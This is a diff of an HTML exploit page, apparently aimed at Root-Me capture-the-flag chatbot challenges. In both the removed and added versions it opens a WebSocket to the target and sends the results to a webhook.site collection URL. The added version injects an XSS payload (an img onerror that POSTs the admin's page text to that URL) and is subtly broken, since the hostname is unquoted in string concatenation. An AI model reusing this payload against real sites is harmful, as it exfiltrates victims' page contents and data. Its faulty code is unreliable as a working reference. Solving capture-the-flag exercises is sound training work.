@@ -1,21 +1,29 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Bug Report</title>
-    <script>
-      window.onload = function() {
-        let ws = new WebSocket("ws://ctf19.root-me.org/ws");
-        ws.onopen = () => {
-          ws.send("flag");
-        };
-        ws.onmessage = (e) => {
-          fetch("https://webhook.site/0693fa2b-5ed3-439e-8073-32e3b5e1e1f9?data=" + encodeURIComponent(e.data));
-        };
-      };
-    </script>
-  </head>
-  <body>
-    <p>Loading...</p>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Chatbot Exploit</title>
+</head>
+<body>
+  <script>
+    // Ouvre le chatbot automatiquement dans une nouvelle fenêtre
+    const w = window.open("https://" + ctf30.root-me.org + "/room", "_blank");
+
+    // Attendre un peu que la page charge (le bot, la websocket...)
+    setTimeout(() => {
+      try {
+        // Injecte un XSS via WebSocket dans le contexte de l'admin
+        w.eval(`
+          var connection = new WebSocket('ws://' + ctf30.root-me.org + '/ws');
+          connection.onopen = function () {
+            connection.send('<img src=x onerror=fetch("https://webhook.site/0693fa2b-5ed3-439e-8073-32e3b5e1e1f9",{method:"POST",body:document.body.innerText})>');
+          }
+        `);
+      } catch (e) {
+        // en cas de refus d'accès cross-origin
+        location.href = "https://ctf30.root-me.org/room";
+      }
+    }, 1000);
+  </script>
+</body>
 </html>
